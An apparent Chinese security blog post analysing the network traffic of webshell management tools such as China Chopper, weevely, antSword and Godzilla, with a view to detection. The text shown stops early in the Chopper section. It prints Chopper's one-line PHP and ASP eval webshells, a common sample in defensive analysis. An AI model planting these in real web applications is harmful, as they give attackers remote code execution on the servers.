@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言常见webshell管理工具的分析记录，着重在流量侧。 0x01 caidao1、配置使用1234菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。支持动态脚本[如php&#x2F;jsp&#x2F;aspx&#x2F;asp]的网站！常用功能：文件管理，虚拟终端，数据库管理，自写脚本。PHP:&lt;?php @eval($_POST[&amp;#x27;chopper&amp;#x27;]);?&gt;ASP:&amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见webshell管理工具的分析记录">
+<meta property="og:url" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="0x00 前言常见webshell管理工具的分析记录，着重在流量侧。 0x01 caidao1、配置使用1234菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。支持动态脚本[如php&#x2F;jsp&#x2F;aspx&#x2F;asp]的网站！常用功能：文件管理，虚拟终端，数据库管理，自写脚本。PHP:&lt;?php @eval($_POST[&amp;#x27;chopper&amp;#x27;]);?&gt;ASP:&amp;l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209210822118.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209221636995.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209221806291.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209222616491.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209223039502.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209225642408.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209225715536.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210000740214.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210001920704.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210002605520.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210131954569.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210132053734.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143610892.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143538128.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210133409194.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210133346898.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210135546731.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210135617377.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210140050100.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210142106462.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143012746.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210142637595.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145618577.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145348515.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145811080.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145930612.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210150440658.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180209633.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180042426.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210181049994.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180652068.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180926672.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210182859530.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210183755345.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210183843587.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210185120328.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210185144952.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210181738181.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210223853362.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210224357132.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210230457328.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210230534084.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210233834293.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211000815660.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210235841839.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211001250430.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211001642820.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211003255149.png">
+<meta property="article:published_time" content="2022-02-09T08:00:20.000Z">
+<meta property="article:modified_time" content="2022-02-10T16:44:21.593Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209210822118.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>常见webshell管理工具的分析记录</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/Analysis-On-CobaltStrike/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%92%8C%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&text=常见webshell管理工具的分析记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&is_video=false&description=常见webshell管理工具的分析记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=常见webshell管理工具的分析记录&body=Check out this article: https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&name=常见webshell管理工具的分析记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&t=常见webshell管理工具的分析记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-caidao"><span class="toc-number">2.</span> <span class="toc-text">0x01 caidao</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">2.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7"><span class="toc-number">2.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-weevely"><span class="toc-number">3.</span> <span class="toc-text">0x02 weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-1"><span class="toc-number">3.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-1"><span class="toc-number">3.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-1"><span class="toc-number">3.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-antSword"><span class="toc-number">4.</span> <span class="toc-text">0x03 antSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-2"><span class="toc-number">4.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-2"><span class="toc-number">4.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-2"><span class="toc-number">4.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-rebeyond"><span class="toc-number">5.</span> <span class="toc-text">0x04 rebeyond</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-3"><span class="toc-number">5.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-3"><span class="toc-number">5.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-3"><span class="toc-number">5.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Godzilla"><span class="toc-number">6.</span> <span class="toc-text">0x05 Godzilla</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-4"><span class="toc-number">6.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-4"><span class="toc-number">6.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-4"><span class="toc-number">6.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%BC%E5%90%88%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">0x06 综合防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        常见webshell管理工具的分析记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-09T08:00:20.000Z" itemprop="datePublished">2022-02-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>常见webshell管理工具的分析记录，着重在流量侧。</p>
+<h2 id="0x01-caidao"><a href="#0x01-caidao" class="headerlink" title="0x01 caidao"></a>0x01 caidao</h2><h3 id="1、配置使用"><a href="#1、配置使用" class="headerlink" title="1、配置使用"></a>1、配置使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。支持动态脚本[如php/jsp/aspx/asp]的网站！</span><br><span class="line">常用功能：文件管理，虚拟终端，数据库管理，自写脚本。</span><br><span class="line">PHP:&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?&gt;</span><br><span class="line">ASP:&lt;%eval request(&quot;chopper&quot;)%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209210822118.png" alt="image-20220209210822118"></p>
+<p>在配置功能是定义数据库信息，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt;类型&lt;/T&gt; 类型可为MYSQL,MSSQL,ORACLE,INFOMIX中的一种</span><br><span class="line">&lt;H&gt;主机地址&lt;H&gt; 主机地址可为机器名或IP地址，如localhost</span><br><span class="line">&lt;U&gt;数据库用户&lt;/U&gt; 连接数据库的用户名，如root</span><br><span class="line">&lt;P&gt;数据库密码&lt;/P&gt; 连接数据库的密码，如123455</span><br><span class="line">&lt;L&gt;utf8&lt;/L&gt; 这一项数据库类型为MYSQL脚本为PHP时可选，不填则为latin1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2、流量特征"><a href="#2、流量特征" class="headerlink" title="2、流量特征"></a>2、流量特征</h3><p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209221636995.png" alt="image-20220209221636995"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209221806291.png" alt="image-20220209221806291"></p>
